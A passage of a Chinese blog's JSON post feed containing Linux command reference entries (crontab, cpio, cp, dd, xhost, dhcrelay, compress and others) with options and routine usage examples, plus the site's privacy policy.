","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"spell","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/spell/","stats":{"text":"1 min read","time":11000,"words":58,"minutes":1},"date":"2022-02-01 02:36:26","dateFormat":"2022-02-01"},{"content":"sftp 协议的服务器端程序。 补充说明 sftp-server 命令是一个“sftp”协议的服务器端程序，它使用加密的方式进行文件传输。 语法 sftp-server ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sftp-server","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sftp-server/","stats":{"text":"1 min read","time":10000,"words":49,"minutes":1},"date":"2022-02-01 02:08:40","dateFormat":"2022-02-01"},{"content":"提交和管理用户的需要周期性执行的任务。 补充说明 crontab 命令被用来提交和管理用户的需要周期性执行的任务，与 windows 下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond 进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。 语法 crontab (选项) (参数) 选项 -e：编辑该用户的计时器设置； -l：列出该用户的计时器设置； -r：删除该用户的计时器设置； -u&lt;用户名称&gt;：指定要设定计时器的用户名称。 参数 crontab 文件：指定包含待执行任务的 crontab 文件。 知识扩展 Linux 下的任务调度分为两类： 系统任务调度和用户任务调度 。 系统任务调度： 系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc目录下有一个 crontab 文件，这个就是系统任务调度的配置文件。 /etc/crontab文件包括下面几行： SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=&quot;&quot;HOME=/ # run-parts 51 * * * * root run-parts /etc/cron.hourly 24 7 * * * root run-parts /etc/cron.daily 22 4 * * 0 root run-parts /etc/cron.weekly 42 4 1 * * root run-parts /etc/cron.monthly 前四行是用来配置 crond 任务运行的环境变量，第一行 shell 变量指定了系统要使用哪个 shell，这里是 bash，第二行 PATH 变量指定了系统执行命令的路径，第三行 MAILTO 变量指定了 crond 的任务执行信息将通过电子邮件发送给 root 用户，如果 MAILTO 变量的值为空，则表示不发送任务执行信息给用户，第四行的 HOME 变量指定了在执行命令或者脚本时使用的主目录。 用户任务调度： 用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的 crontab 文件都被保存在/var/spool/cron目录中。其文件名与用户名一致，使用者权限文件如下： /etc/cron.deny 该文件中所列用户不允许使用crontab命令 /etc/cron.allow 该文件中所列用户允许使用crontab命令 /var/spool/cron/ 所有用户crontab文件存放的目录,以用户名命名 crontab 文件的含义：用户所建立的 crontab 文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下： minute hour day month week command 顺序：分 时 日 月 周 其中： minute： 表示分钟，可以是从 0 到 59 之间的任何整数。 hour：表示小时，可以是从 0 到 23 之间的任何整数。 day：表示日期，可以是从 1 到 31 之间的任何整数。 month：表示月份，可以是从 1 到 12 之间的任何整数。 week：表示星期几，可以是从 0 到 7 之间的任何整数，这里的0或7代表星期日。 command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。 在以上各个字段中，还可以使用以下特殊字符： 星号（*）：代表所有可能的值，例如 month 字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9” 中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6” 正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在 minute 字段，表示每十分钟执行一次。 crond服务 /sbin/service crond start # 启动服务 /sbin/service crond stop # 关闭服务 /sbin/service crond restart # 重启服务 /sbin/service crond reload # 重新载入配置 查看crontab服务状态： service crond status 手动启动crontab服务： service crond start 查看crontab服务是否已设置为开机启动，执行命令： ntsysv 加入开机自动启动： chkconfig –level 35 crond on 实例 每1分钟执行一次command * * * * * command 每小时的第3和第15分钟执行 3,15 * * * * command 在上午8点到11点的第3和第15分钟执行 3,15 8-11 * * * command 每隔两天的上午8点到11点的第3和第15分钟执行 3,15 8-11 */2 * * command 每个星期一的上午8点到11点的第3和第15分钟执行 ```Shell 3,15 8-11 * * 1 command 每晚的21:30重启smb 30 21 * * * /etc/init.d/smb restart 每月1、10、22日的4 : 45重启smb 45 4 1,10,22 * * /etc/init.d/smb restart 每周六、周日的1:10重启smb 10 1 * * 6,0 /etc/init.d/smb restart 每天18 : 00至23 : 00之间每隔30分钟重启smb 0,30 18-23 * * * /etc/init.d/smb restart 每星期六的晚上11:00 pm重启smb 0 23 * * 6 /etc/init.d/smb restart 每一小时重启smb * */1 * * * /etc/init.d/smb restart 晚上11点到早上7点之间，每隔一小时重启smb * 23-7/1 * * * /etc/init.d/smb restart 每月的4号与每周一到周三的11点重启smb 0 11 4 * mon-wed /etc/init.d/smb restart 一月一号的4点重启smb 0 4 1 jan * /etc/init.d/smb restart 每小时执行/etc/cron.hourly目录内的脚本 01 * * * * root run-parts /etc/cron.hourly ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"crontab","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/crontab/","stats":{"text":"6 min read","time":340000,"words":1437,"minutes":6},"date":"2022-01-31 23:50:16","dateFormat":"2022-01-31"},{"content":"用来建立、还原备份档的工具程序。 补充说明 cpio 命令主要是用来建立或者还原备份档的工具程序，cpio 命令可以复制文件到归档包中，或者从归档包中复制文件。 语法 cpio (选项) 选项 -0或--null：接受新增列控制字符，通常配合find指令的“-print0”参数使用； -a或--rest-access-time：重新设置文件的存取时间； -A或--append：附加到已存在的备份文档中，且这个备份文档必须存放在磁盘上，而不能放置于磁带机里； -b或--awap：此参数的效果和同时指定“-ss”参数相同； -B：将输入/输出的区块大小改成5210Bytes； -c：使用旧ASCII备份格式； -C&lt;区块大小&gt;或--io-size=&lt;区块大小&gt;：设置输入/输出的区块大小，单位是Byte； -d或--make-directories：如有需要cpio会自行建立目录； -E&lt;范本文件&gt;或--pattern-file=&lt;范本文件&gt;：指定范本文件，其内含有一个或多个范本样式，让cpio解开符合范本条件的文件，格式为每列一个范本样式； -f或--nonmatching：让cpio解开所有不符合范本条件的文件； -F&lt;备份档&gt;或--file=&lt;备份档&gt;：指定备份档的名称，用来取代标准输入或输出，也能借此通过网络使用另一台主机的保存设备存取备份档； -H&lt;备份格式&gt;：指定备份时欲使用的文件格式； -i或--extract：执行copy-in模式，还原备份档； -l&lt;备份档&gt;：指定备份档的名称，用来取代标准输入，也能借此通过网络使用另一台主机的保存设备读取备份档； -k：此参数将忽略不予处理，仅负责解决cpio不同版本间的兼容性问题； -l或--link：以硬连接的方式取代复制文件，可在copy-pass模式下运用； -L或--dereference：不建立符号连接，直接复制该连接所指向的原始文件； -m或preserve-modification-time：不去更改文件的更改时间； -M&lt;回传信息&gt;或--message=&lt;回传信息&gt;：设置更换保存媒体的信息； -n或--numeric-uid-gid：使用“-tv”参数列出备份档的内容时，若再加上参数“-n”，则会以用户识别和群组识别码替代拥有者和群组名称列出文件清单； -o或--create：执行copy-out模式，建立备份档； -O&lt;备份档&gt;：指定备份档的名称，用来取代标准输出，也能借此通过网络使用另一台主机的保存设备存放备份档； -p或--pass-through：执行copy-pass模式，略过备份步骤，直接将文件复制到目的目录； -r或--rename：当有文件名称需要更改时，采用互动模式； -R&lt;拥有者&gt;&lt;:/.&gt;&lt;所属群组&gt;或----owner&lt;拥有者&gt;&lt;:/.&gt;&lt;所属群组&gt; 在copy-in模式还原备份档，或copy-pass模式复制文件时，可指定这些备份，复制的文件的拥有者与所属群组； -s或--swap-bytes：交换每队字节的内容； -S或--swap-halfwords：交换每半个字节的内容； -t或--list：将输入的内容呈现出来； -u或--unconditional：置换所有文件，不论日期时间的新旧与否，皆不予询问而直接覆盖； -v或--verbose：详细显示指令的执行过程； -V或--dot：执行指令时。在每个文件的执行程序前面加上“.”号； --block-size=&lt;区块大小&gt;：设置输入/输出的区块大小，假如设置数值为5，则区块大小为2500，若设置成10，则区块大小为5120，以此类推； --force-local：强制将备份档存放在本地主机； --help：在线帮助； --no-absolute-filenames：使用相对路径建立文件名称； --no-preserve-owner：不保留文件的拥有者，谁解开了备份档，那些文件就归谁所有； -only-verify-crc：当备份档采用CRC备份格式时，可使用这项参数检查备份档内的每个文件是否正确无误； --quiet：不显示复制了多少区块； --sparse：倘若一个文件内含有大量的连续0字节，则将此文件存在稀疏文件； --version：显示版本信息。 实例 将/etc下的所有普通文件都备份到/opt/etc.cpio，使用以下命令： find /etc –type f | cpio –ocvB &gt;/opt/etc.cpio 将系统上所有资料备份到磁带机内，使用以下命令： find / -print | cpio -covB &gt; /dev/st0 这里的/dev/st0是磁带的设备名，代表 SCSI`磁带机。 查看上例磁带机上备份的文件，使用以下命令： cpio -icdvt &lt; /dev/st0 &gt; /tmp/st_content 有时可能因为备份的文件过多，一个屏幕无法显示完毕，此时我们利用下面命令，让磁带机的文件信息输出到文件。 将示例1中的备份包还原到相应的位置，如果有相同文件进行覆盖，使用以下命令： cpio –icduv &lt; /opt/etc.cpio 注意，cpio 恢复的路径，如果 cpio 在打包备份的时候用的是绝对路径，那么在恢复的时候会自动恢复到这些绝对路径下，本例就会将备份文件全部还原到 /etc 路径下对应的目录中。同理，如果在打包备份用的是相对路径，还原时也将恢复到相对路径下。 通过上面的示例，可以看出，cpio 无法直接读取文件，它需要每个文件或者目录的完整路径名才能识别读取，而 find 命令的输出刚好做到了这点，因此，cpio 命令一般和 find 命令配合使用。其实，上面的示例我们已经看到了它们的组合用法。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cpio","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cpio/","stats":{"text":"6 min read","time":335000,"words":1505,"minutes":6},"date":"2022-01-31 23:48:25","dateFormat":"2022-01-31"},{"content":"将源文件或目录复制到目标文件或目录中。 补充说明 cp 命令用来将一个或多个源文件或者目录复制到指定的目的文件或目录。它可以将单个源文件复制成一个指定文件名的具体的文件或一个已经存在的目录下。cp 命令还支持同时复制多个文件，当一次复制多个文件时，目标文件参数必须是一个已经存在的目录，否则将出现错误。 语法 cp (选项) (参数) 选项 -a：此参数的效果和同时指定&quot;-dpR&quot;参数相同； -d：当复制符号连接时，把目标文件或目录也建立为符号连接，并指向与源文件或目录连接的原始文件或目录； -f：强行复制文件或目录，不论目标文件或目录是否已存在； -i：覆盖既有文件之前先询问用户； -l：对源文件建立硬连接，而非复制文件； -p：保留源文件或目录的属性； -R/r：递归处理，将指定目录下的所有文件与子目录一并处理； -s：对源文件建立符号连接，而非复制文件； -u：使用这项参数后只会在源文件的更改时间较目标文件更新时或是名称相互对应的目标文件并不存在时，才复制文件； -S：在备份文件时，用指定的后缀“SUFFIX”代替文件的默认后缀； -b：覆盖已存在的文件目标前将目标文件备份； -v：详细显示命令执行的操作。 参数 源文件：制定源文件列表。默认情况下，cp 命令不能复制目录，如果要复制目录，则必须使用-R选项； 目标文件：指定目标文件。当“源文件”为多个文件时，要求“目标文件”为指定的目录。 实例 下面的第一行中是 cp 命令和具体的参数（-r 是“递归”， -u 是“更新”，-v 是“详细”）。接下来的三行显示被复制文件的信息，最后一行显示命令行提示符。这样，只拷贝新的文件到我的存储设备上，我就使用 cp 的“更新”和“详细”选项。 通常来说，参数-r也可用更详细的风格--recursive。但是以简短的方式，也可以这么连用-ruv。 cp -r -u -v /usr/men/tmp ~/men/tmp 版本备份--backup=numbered参数意思为“我要做个备份，而且是带编号的连续备份”。所以一个备份就是 1 号，第二个就是 2 号，等等。 $ cp --force --backup=numbered test1.py test1.py $ ls test1.py test1.py.~1~ test1.py.~2~ 如果把一个文件复制到一个目标文件中，而目标文件已经存在，那么，该目标文件的内容将被破坏。此命令中所有参数既可以是绝对路径名，也可以是相对路径名。通常会用到点.或点点..的形式。例如，下面的命令将指定文件复制到当前目录下： cp ../mary/homework/assign . 所有目标文件指定的目录必须是己经存在的，cp命令不能创建目录。如果没有文件复制的权限，则系统会显示出错信息。 将文件file复制到目录/usr/men/tmp下，并改名为 file1 cp file /usr/men/tmp/file1 将目录/usr/men下的所有文件及其子目录复制到目录/usr/zh中 cp -r /usr/men /usr/zh 交互式地将目录/usr/men中的以 m 打头的所有 .c 文件复制到目录/usr/zh中 cp -i /usr/men m*.c /usr/zh 我们在 Linux 下使用 cp 命令复制文件时候，有时候会需要覆盖一些同名文件，覆盖文件的时候都会有提示：需要不停的按 Y 来确定执行覆盖。文件数量不多还好，但是要是几百个估计按 Y 都要吐血了，于是折腾来半天总结了一个方法： cp aaa/* /bbb # 复制目录aaa下所有到/bbb目录下，这时如果/bbb目录下有和aaa同名的文件，需要按Y来确认并且会略过aaa目录下的子目录。 cp -r aaa/* /bbb # 这次依然需要按Y来确认操作，但是没有忽略子目录。 cp -r -a aaa/* /bbb # 依然需要按Y来确认操作，并且把aaa目录以及子目录和文件属性也传递到了/bbb。 \\cp -r -a aaa/* /bbb # 成功，没有提示按Y、传递了目录属性、没有略过目录。 递归强制复制目录到指定目录中覆盖已存在文件 cp -rfb ./* ../backup # 将当前目录下所有文件，复制到当前目录的兄弟目录 backup 文件夹中 拷贝目录下的隐藏文件如.babelrc cp -r aaa/.* ./bbb # 将 aaa 目录下的，所有`.`开头的文件，复制到 bbb 目录中。 cp -a aaa ./bbb/ # 记住后面目录最好的'/' 带上 `-a` 参数 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"cp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/cp/","stats":{"text":"5 min read","time":279000,"words":1272,"minutes":5},"date":"2022-01-31 23:45:05","dateFormat":"2022-01-31"},{"content":"把老的配额文件转换为新的格式。 补充说明 convertquota 命令用于将老的磁盘额数据文件（&quot;quota.user&quot; 和 &quot;quota.group&quot;）转换为新格式的文件（&quot;quota.user&quot; 和 &quot;quota.group&quot;）。 语法 convertquota (选项) (参数) 选项 -u：仅转换用户磁盘配额数据文件； -g：仅转换组磁盘配额数据文件； -f：将老的磁盘配额文件转换为新的格式； -e：将新的文件格式从大字节序换为小字节序。 参数 文件系统：指定要转换磁盘配额数据文件格式的文件系统（硬盘分区）。 实例 使用 convertquota 指令转换指定文件系统/data的磁盘配额数据文件。在命令行中输入下面的命令： convertquota -u /data //转换文件系统&quot;/data&quot;上的用户磁盘配额文件 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"convertquota","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/convertquota/","stats":{"text":"1 min read","time":49000,"words":221,"minutes":1},"date":"2022-01-31 23:43:44","dateFormat":"2022-01-31"},{"content":"结束本次循环，继续执行下一个 for，while 或 until 循环。 概要 continue [n] 主要用途 结束本次循环，继续执行下一个 for，while 或 until 循环；可指定从第几层循环继续执行。 参数 n（可选）：大于等于1的整数，用于指定从第几层循环继续执行。 返回值 返回状态为成功除非 n 小于 1。 例子 # continue的可选参数n缺省值为1。 for((i=3;i&gt;0;i--)); do # 跳到内层for循环继续执行。 for((j=3;j&gt;0;j--)); do if((j==2)); then # 换成continue 1时结果一样 continue fi printf &quot;%s %s\\n&quot; ${i} ${j} done done # 输出结果 3 3 3 1 2 3 2 1 1 3 1 1 # 当n为2时： # 跳到外层for循环继续执行。 for((i=3;i&gt;0;i--)); do for((j=3;j&gt;0;j--)); do if((j==2)); then continue 2 fi printf &quot;%s %s\\n&quot; ${i} ${j} done done # 输出结果 3 3 2 3 1 3 注意 该命令是 bash 内建命令，相关的帮助信息请查看 help 命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"continue","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/continue/","stats":{"text":"2 min read","time":70000,"words":264,"minutes":2},"date":"2022-01-31 23:42:12","dateFormat":"2022-01-31"},{"content":"输出已连接的终端类型。 补充说明 consoletype 命令用于打印已连接的终端类型到标准输出，并能够检查已连接的终端是当前终端还是虚拟终端。 语法 consoletype 实例 [root@localhost ~]# consoletype pty ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"consoletype","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/consoletype/","stats":{"text":"1 min read","time":14000,"words":65,"minutes":1},"date":"2022-01-31 23:41:13","dateFormat":"2022-01-31"},{"content":"检测物理卷的 LVM 元数据的一致性。 补充说明 pvck 命令用来检测物理卷的 LVM 元数据的一致性。默认情况下，物理卷中的前 4 个扇区保存着 LVM 卷标，可以使用--labelsector选项指定其他的位置（例如：数据恢复时）。 语法 pvck (选项) (参数) 选项 -d：调试模式； -v：详细信息模式； --labelsector：指定LVE卷标所在扇区。 参数 物理卷：指定要检查的物理卷对应的设备文件。 实例 使用 pvck 命令检查物理卷/dev/sdb1。在命令行中输入下面的命令： pvck -v /dev/sdb1 #检查物理卷元数据 Scanning /dev/sdb1 Found label on /dev/sdb1, sector 1, type=LVM2 001 Found text metadata area: offset=4096, size=192512 Found LVM2 metadata record at offset=125952, size=70656, offset2=0 size2=0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pvck","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pvck/","stats":{"text":"1 min read","time":49000,"words":203,"minutes":1},"date":"2022-01-31 21:10:21","dateFormat":"2022-01-31"},{"content":"制哪些 X 客户端能够在 X 服务器上显示。 补充说明 xhost 命令是 X 服务器的访问控制工具，用来控制哪些 X 客户端能够在 X 服务器上显示。该命令必须从有显示连接的机器上运行。可以通过使用-host参数，从访问列表中除去一个名称。不要从访问列表中除去当前的名称。如果已经这样做了，请在作出任何更改之前注销系统。 语法 xhost (参数) 参数 +：关闭访问控制，允许任何主机访问本地的 X 服务器； -：打开访问控制，仅允许授权清单中的主机访问本地的 X 服务器。 输入无变量的 xhost 命令将显示访问 X 服务器的当前主机名，并显示一条消息表明访问是否已启用。 为了安全起见，只能从控制主机运行影响访问控制的选项。对于工作站来说，这台机器也就是服务器。对于 X 终端来说，这台机器是登录主机。 要在缺省情况下启用远程名称，可以在/etc/X?.hosts文件中定义名称，其中?为启用访问的显示器号。 例如，显示器jeanne:0可以由使用 jeanne 的缺省主机名的系统上的/etc/X0.hosts文件中定义的系统访问。在显示名称和文件名中，0 表明已定义的远程系统允许通过增强 X-Windows 访问的显示器号。 注意：-name参数，定义要从 X 服务器访问列表中除去的主机名。已有的连接没有被中断，但将拒绝新的连接请求。注意：可以除去当前的机器； 然而，不允许进行进一步的连接（包括试图将其添加回来）。再一次启用本地连接的唯一方法就是将服务器复位（因此也会中断所有连接）。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xhost","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xhost/","stats":{"text":"2 min read","time":105000,"words":503,"minutes":2},"date":"2022-01-31 21:02:20","dateFormat":"2022-01-31"},{"content":"使用 dhcrelay 命令可以提供中继 DHCP 和 BOOTP 请求。 补充说明 使用 dhcrelay 命令可以提供中继 DHCP 和 BOOTP 请求，从一个没有 DHCP 服务器的子网直接连接到其它子网内的一个或多个 DHCP 服务器。该命令在 DHCP 中继服务器上使用，同时支持 DHCPv4/BOOTP 和 DHCPv6 协议。 语法 dhcrelay [选项] [DHCP服务器] 选项 -c &lt;跳数&gt; 当转发数据包时，dhcrelay丢弃已经达到一个最大跳数的数据包。默认值是10，最大值是255 -4 运行dhcrelay命令作为DHCPv4/BOOTP中继代理。这是默认操作模式 -6 运行dhcrelay命令作为DHCPv6中继代理 -q 安静模式 -p &lt;端口&gt; 监听和发送端口。DHCPv4/BOOTP默认端口是67，DHCPv6默认端口是547 -A &lt;长度&gt; 指定发送到DHCP服务器的最大数据包大小 -d 强制dhcrelay命令作为前台进程运行 例子 指定DHCP服务器的位置。 [root@localhost ~]# dhcrelay 192.168.0.2 Internet Systems Consortium DHCP Relay Agent4.1.1-P1 Copyright 2004-2010 Internet SystemsConsortium. All rights reserved. For info, please visithttps://www.isc.org/software/dhcp/ Listening on LPF/eth1/00:0c:29:fc:2f:ef Sending on LPF/eth1/00:0c:29:fc:2f:ef Listening on LPF/eth0/00:0c:27:fc:25:ec Sending on LPF/eth0/00:0c:27:fc:25:ec Sending on Socket/fallback ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dhcrelay","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dhcrelay/","stats":{"text":"2 min read","time":85000,"words":328,"minutes":2},"date":"2022-01-31 20:05:05","dateFormat":"2022-01-31"},{"content":"复制文件并对原文件的内容进行转换和格式化处理。 补充说明 dd 命令用于复制文件并对原文件的内容进行转换和格式化处理。dd 命令功能很强大的，对于一些比较底层的问题，使用 dd 命令往往可以得到出人意料的效果。用的比较多的还是用 dd 来备份裸设备。但是不推荐，如果需要备份 oracle 裸设备，可以使用 rman 备份，或使用第三方软件备份，使用 dd 的话，管理起来不太方便。 建议在有需要的时候使用 dd 对物理磁盘操作，如果是文件系统的话还是使用 tar backup cpio 等其他命令更加方便。另外，使用 dd 对磁盘操作时，最好使用块设备文件。 语法 dd (选项) 选项 bs=&lt;字节数&gt;：将ibs（输入）与obs（输出）设成指定的字节数； cbs=&lt;字节数&gt;：转换时，每次只转换指定的字节数； conv=&lt;关键字&gt;：指定文件转换的方式； count=&lt;区块数&gt;：仅读取指定的区块数； ibs=&lt;字节数&gt;：每次读取的字节数； obs=&lt;字节数&gt;：每次输出的字节数； of=&lt;文件&gt;：输出到文件； seek=&lt;区块数&gt;：一开始输出时，跳过指定的区块数； skip=&lt;区块数&gt;：一开始读取时，跳过指定的区块数； --help：帮助； --version：显示版本信息。 实例 [root@localhost text]# dd if=/dev/zero of=sun.txt bs=1M count=1 1+0 records in 1+0 records out 1048576 bytes (1.0 MB) copied, 0.006107 seconds, 172 MB/s [root@localhost text]# du -sh sun.txt 1.1M sun.txt 该命令创建了一个1M大小的文件sun.txt，其中参数解释： if 代表输入文件。如果不指定if，默认就会从stdin中读取输入。 of 代表输出文件。如果不指定of，默认就会将stdout作为默认输出。 bs 代表字节为单位的块大小。 count 代表被复制的块数。 /dev/zero 是一个字符设备，会不断返回0值字节（\\0）。 块大小可以使用的计量单位表 单元大小 代码 字节（1B） c 字节（2B） w 块（512B） b 千字节（1024B） k 兆字节（1024KB） M 吉字节（1024MB） G 以上命令可以看出dd命令来测试内存操作速度： 1048576 bytes (1.0 MB) copied, 0.006107 seconds, 172 MB/s 生成随机字符串 我们甚至可以使用 /dev/urandom 设备配合 dd 命令 来获取随机字符串。 [root@localhost ~]# dd if=/dev/urandom bs=1 count=15|base64 -w 0 15+0 records in 15+0 records out 15 bytes (15 B) copied, 0.000111993 s, 134 kB/s wFRAnlkXeBXmWs1MyGEs ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dd/","stats":{"text":"3 min read","time":165000,"words":682,"minutes":3},"date":"2022-01-31 19:22:13","dateFormat":"2022-01-31"},{"content":"为了让您安心使用 Raz1ner 网站（以下称为本网站）的各项服务与资讯，特此向您说明本网站的隐私政策和使用条款，以保障您的权益，请详细阅读以下内容： 适用范围 本网站的服务可能包含指向其他站点的链接。如果单击第三方链接，您将被定向到该站点。请注意，这些外部站点不是由本网站运营的。因此，隐私政策仅适用于本网站的所有链接，不适用于本网站以外的站点链接。本网站强烈建议您阅读外部网站的隐私政策。本网站无法控制任何第三方站点的服务内容、隐私权政策或行为，也不对此承担任何责任。 信息收集和使用 本网站不会主动收集或记录用户的任何数据，也不会上传到服务器，本网站的功能均在本地运行。 本网站使用 hit-counte 第三方服务，用于记录网站的点击次数。 本网站使用 Google AdSense 服务，相关政策请查看：https://support.google.com/adspolicy/answer/6008942?hl=zh-Hans 本网站绝对不会提供、交换、出租或出售任何您的个人资料给其他个人、团体、私人企业或公务机关。 对自己行为负责 您同意不得将本网站用于任何违法或非道德目的，并且您将遵守所有适用与任何在地国家或地区的法律和法规。 您充分了解并且同意，您必须为自己使用本网站的一切行为负责。您导致任何第三方损害或者因自主行为导致自己受到损害，您应当独立承担责任。 版权声明 本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！ 内容变更 本网站可能会不时的更新使用条款和隐私政策。因此，建议您定期查看此页面的任何更改。本网站会通过此页面发布新的使用条款和隐私政策来通知您。这些更改在此页面上发布后立即生效。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"隐私政策以及使用条款","feature":"","link":"https://dev-coco.github.io/post/Terms-and-Privacy/","stats":{"text":"2 min read","time":119000,"words":579,"minutes":2},"date":"2022-01-31 16:24:48","dateFormat":"2022-01-31"},{"content":"将目前动作延迟一段时间。 补充说明 sleep 命令暂停指定的时间。 语法 sleep (参数) 参数 时间：指定要暂停时间的长度。 时间长度，后面可接 s、m、h 或 d，其中 s 为秒，m 为 分钟，h 为小时，d 为日数。 实例 有时在写一些以循环方式运行的监控脚本，设置时间间隔是必不可少的，下面是一个 Shell 进度条的脚本演示在脚本中生成延时。 #!/bin/bash b='' for ((i=0;$i&lt;=100;i++)) do printf &quot;Progress:[%-100s]%d%%\\r&quot; $b $i sleep 0.1 b=#$b done echo ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sleep","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sleep/","stats":{"text":"1 min read","time":37000,"words":155,"minutes":1},"date":"2022-01-31 15:54:20","dateFormat":"2022-01-31"},{"content":"使用 Lempress-Ziv 编码压缩数据文件。 补充说明 compress 命令使用 Lempress-Ziv 编码压缩数据文件。compress 是个历史悠久的压缩程序，文件经它压缩后，其名称后面会多出 &quot;.Z&quot; 的扩展名。当要解压缩时，可执行 uncompress 指令。事实上 uncompress 是指向 compress 的符号连接，因此不论是压缩或解压缩，都可通过 compress 指令单独完成。 语法 compress (选项) (参数) 选项 -f：不提示用户，强制覆盖掉目标文件； -c：将结果送到标准输出，无文件被改变； -r：递归的操作方式； -b&lt;压缩效率&gt;：压缩效率是一个介于9~16的数值，预设值为&quot;16&quot;，指定愈大的数值，压缩效率就愈高； -d：对文件进行解压缩而非压缩； -v：显示指令执行过程； -V：显示指令版本及程序预设值。 参数 文件：指定要压缩的文件列表。 实例 将/etc/man.config复到/tmp ，并加以压缩 [root@localhost ~]# cd /tmp [root@localhost tmp]# cp /etc/man.config . [root@localhost tmp]# compress man.config [root@localhost tmp]# ls -l -rw-r--r-- 1 root root 2605 Jul 27 11:43 man.config.Z 将刚刚的压缩档解开 [root@localhost tmp]# compress -d man.config.Z 将 man.config 压缩成另外一个文件来备份 [root@localhost tmp]# compress -c man.config &gt; man.config.back.Z [root@localhost tmp]# ll man.config* -rw-r--r-- 1 root root 4506 Jul 27 11:43 man.config -rw-r--r-- 1 root root 2605 Jul 27 11:46 man.config.back.Z 这个-c的选项比较有趣！会将压缩过程的资料输出到屏幕上，而不是写入成为 file.Z 文件。所以，我们可以透过资料流重导向的方法将资料输出成为另一个档名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"compress","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/compress/","stats":{"text":"2 min read","time":111000,"words":444,"minutes":2},"date":"2022-01-31 15:38:43","dateFormat":"2022-01-31"},{"content":"调用并执行指定的命令。 补充说明 command 命令调用指定的指令并执行，命令执行时不查询shell函数。command 命令只能够执行 shell 内部的命令。 语法 command (参数) 参数 指令：需要调用的指令及参数。 实例 使用 command 命令调用执行echo Linux，输入如下命令： command echo Linux #调用执行shell内部指令 上面的命令执行后，将调用执行命令echo Linux ，其执行结果如下： Linux ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"command","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/command/","stats":{"text":"1 min read","time":28000,"words":127,"minutes":1},"date":"2022-01-31 15:36:51","dateFormat":"2022-01-31"},{"content":"按行比较两个已排序的文件。 概要 comm [OPTION]... FILE1 FILE2 主要用途 按行比较两个已排序的文件。 当FILE1或FILE2为-时，读取标准输入。 无选项时输出三列，第一列为FILE1独有的行，第二列为FILE2独有的行，第三列为FILE1，FILE2共有的行。 选项 -1 不输出第一列。 -2 不输出第二列。 -3 不输出第三列。 --check-order 检查输入行是否正确的排序，即使它们确实是已排序过的。 --nocheck-order 不检查输入行是否正确的排序。 --output-delimiter=STR 使用STR作为输出列之间的分隔符而不是默认的TAB。 --total 额外地增加第四列输出概要。 -z, 